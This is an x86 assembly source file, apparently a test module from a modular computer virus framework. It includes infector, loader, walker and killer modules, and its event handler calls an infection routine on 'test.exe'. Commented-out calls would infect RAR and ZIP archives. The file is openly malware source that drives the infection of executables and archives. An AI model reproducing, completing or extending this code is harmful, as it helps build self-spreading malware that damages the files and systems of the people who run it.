
include                 TEST.INC
include                 ..\..\INCLUDE\consts.inc
include                 ..\FILEIO\FILEIO.INC
include                 ..\MEMORY\MEMORY.INC
include                 ..\PLAN\PLAN.INC
include                 ..\INFECTA\INFECTA.INC
include                 ..\INFECTB\INFECTB.INC
include                 ..\LDRWIN32\ldrwin32.INC
include                 ..\MAIN\main.INC
include                 ..\WALKER\walker.INC
include                 ..\KILLER\killer.INC
include                 ..\EXAMPLE\example.INC

                        extrn   Event:PROC

                        public  HandleEvent

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

rsafile                 db      'rsa.dat',0
filename                db      'test.exe',0
arc1                    db      'test.rar',0
arc2                    db      'test.zip',0

buf_ptr                 dd      ?
buf_size                dd      ?

                        .code

HandleEvent:
                        mov     eax, [esp+4]    ; event_id

                        cmp     eax, EV_PLAN_PER_PROCESS
                        jne     __return_0

                        pusha

                        push    0
                        push    EV_EXAMPLE_IN_EVENT
                        call    Event
                        add     esp, 8

                        push    0
                        push    11111111h
                        call    Event
                        add     esp, 8

;                       push    offset arc1
;                       callW   infect_rar
;                       add     esp, 4

;                       push    offset arc2
;                       callW   infect_zip
;                       add     esp, 4

;                       push    offset filename
;                       push    EV_INFECTA_INFECTFILE
;                       call    Event
;                       add     esp, 8

; include _x2.

                        push    offset filename
                        push    EV_INFECTB_INFECTFILE
                        call    Event
                        add     esp, 8

                        popa

__return_0:             xor     eax, eax
                        retn

                        end
